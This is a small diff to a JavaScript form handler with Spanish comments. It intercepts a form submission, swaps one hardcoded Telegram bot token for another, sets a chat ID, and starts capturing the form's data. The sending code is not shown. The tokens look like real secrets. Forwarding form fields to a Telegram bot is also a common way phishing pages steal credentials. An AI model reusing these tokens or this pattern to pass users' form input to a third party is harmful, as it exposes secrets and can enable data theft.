@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function () {
         event.preventDefault(); // Evita el envío tradicional del formulario
 
         // Datos del bot de Telegram
-        const token = "7584579761:AAF_gz-XhA7nA9wSzN6OaWP6Ml1UX9DGgkU";
+        const token = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ";
         const chat_id = "5157616506";
 
         // Captura de datos del formulario
